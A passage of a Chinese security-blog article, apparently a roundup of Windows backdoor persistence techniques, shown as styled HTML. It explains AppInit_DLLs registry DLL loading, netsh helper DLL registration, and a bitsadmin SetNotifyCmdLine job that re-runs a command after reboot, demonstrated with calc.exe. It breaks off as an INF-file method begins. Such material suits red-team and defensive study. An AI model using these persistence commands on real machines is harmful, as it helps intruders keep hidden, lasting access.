Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">AppInit_DLLs</code>注册表项，如果有值，调用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">LoadLibrary() api</code>加载用户dll。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">其注册表位置为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>，把<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">AppInit_DLLs</code>的键值设置为我们dll路径，将<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">LoadAppInit_DLLs</code>设置为1</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.41817087845968715" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/43_YicPDDugVEKSvCYgtI81HtZHKqt5ww.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgWDPyTUaDOpTXicNN7GtQg16ibumYicPDDugVEKSvCYgtI81HtZHKqt5ww/640?wx_fmt=png'" data-type="png" data-w="1662"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下：</p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5400485436893204" data-s="300,640" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/44_7zj9ER15STpvBIo4O1RibU1jzj9pJA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgZxvDI6B338wLnPKU3DjtU4WE77zj9ER15STpvBIo4O1RibU1jzj9pJA/640?wx_fmt=gif'" data-type="gif" data-w="1648" style=""  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Netsh helper</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">netsh</code>（全称：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Network Shell</code>） 是<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">windows</code>系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">netsh add helper yourdll.dll</code>来添加拓展功能，添加了之后，在启动<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">netsh</code>的时候就会加载我们dll文件</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">添加自定义<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">helper dll</code><br  />关于<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">helper dll</code>的编写可以参考这个项目：<span style="color: rgb(255, 104, 39);">https://github.com/outflanknl/NetshHelperBeacon</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">我们可以使用两种方式来添加helper：</span></p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">通过cmd添加helper</span></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;"><span style="font-size:15px;line-height:35px;;">netsh add helper test.dll</span></code></pre></li></ol><p style="margin-top: 16px;margin-bottom: 24px;"><img class="" data-ratio="0.4074074074074074" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/45_UG8kXGP700E8EqgKQJ5k2zIibvlhFQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg5svCdbM9okicF4diaVMlpxHKiao5UG8kXGP700E8EqgKQJ5k2zIibvlhFQ/640?wx_fmt=png'" data-type="png" data-w="918"  /></p><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">2.通过注册表添加helper</span><br  /><span style="font-size:15px;line-height:35px;;">其位置为：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</span></code><span style="font-size:15px;line-height:35px;;">，创建一个键，名称随便，键值为我们dll的路径</span></p><p style="margin-top: 16px;margin-bottom: 24px;"><span style="background-color: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;"><img class="" data-ratio="0.4897713598074609" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/46_yq0fpOTspKEVXd4Dbc4YCleYiavRdQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgb8F3MbPd1R40ZOSnt9PYPe2uGyq0fpOTspKEVXd4Dbc4YCleYiavRdQ/640?wx_fmt=png'" data-type="png" data-w="1662"  /></span></p><p style="margin-top: 16px;margin-bottom: 24px;"><span style="background-color: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;">效果如下</span><span style="font-size:15px;line-height:35px;;"></span></p><p style="margin-top: 16px;margin-bottom: 24px;"><span style="background-color: rgb(255, 255, 255);font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/47_zwIMsqb8mLslY5Y3SWuiaYVYd8YzhA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgcLyblYctv37elKAz2Pp4bTYZ3zwIMsqb8mLslY5Y3SWuiaYVYd8YzhA/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></span></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">利用BITS</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">BITS</code>&nbsp;(后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">bitsadmin</code>是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">bitsadmin /?</code>或<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">bitsadmin /HELP</code>获取帮助列表。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">常见的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">bitsadmin</code>命令</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">bitsadmin /create [type] DisplayName //创建一个任务<br  />bitsadmin /cancel &lt;Job&gt; //删除一个任务<br  />bitsadmin /list /allusers /verbose //列出所有任务<br  />bitsadmin /AddFile &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; //给任务test添加一个下载文件<br  />bitsadmin /SetNotifyCmdLine &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。<br  />bitsadmin /Resume &lt;Job&gt; //激活传输队列中的新任务或挂起的任务。<br  />bitsadmin /cancel &lt;Job&gt; //删除某个任务<br  />bitsadmin /reset /allusers //删除所有任务<br  />bitsadmin /complete &lt;Job&gt; //完成某个任务</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">下面我们来测试一下：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">bitsadmin /create test<br  />bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件<br  />bitsadmin /SetNotifyCmdLine test cmd.exe "cmd.exe /c calc.exe"<br  />bitsadmin /resume test</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/48_N7MIJ1AMAUf7yeVFiaUyMRfcicGyWQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgYLpCUOAFFOC4ibMUV3VibpbsVliayN7MIJ1AMAUf7yeVFiaUyMRfcicGyWQ/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">重启电脑之后任务还是存在</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.7102330293819655" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/49_O9icu7n9t6HyGQrR4rq0Eoo61NVcAw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgfpL0bmH5s04kvz1Jw8Aul53ib0O9icu7n9t6HyGQrR4rq0Eoo61NVcAw/640?wx_fmt=png'" data-type="png" data-w="987"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行（由于时间太长了就不录制gif了）</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.6585858585858586" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/50_YX5TmxILhxAkpqmf6mLHSBZOVHHttg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgSKSlWEOhiaiaPI3EzPFbtGic2QaYX5TmxILhxAkpqmf6mLHSBZOVHHttg/640?wx_fmt=png'" data-type="png" data-w="990"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如果我们想让任务完成，可以执行<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">bitsadmin /complete test</code>，<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">calc.exe</code>也会复制到桌面上</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.6436041834271923" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/51_hwtHc8Qa5fxeEYbmUmkTYibHpfN1tw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgR5WHJvQ2ZCbfr3M38QD3YWhm6hwtHc8Qa5fxeEYbmUmkTYibHpfN1tw/640?wx_fmt=png'" data-type="png" data-w="1243"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">利用inf文件实现后门</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">inf</code>文件</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。<br  />PS：来自WIKI</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 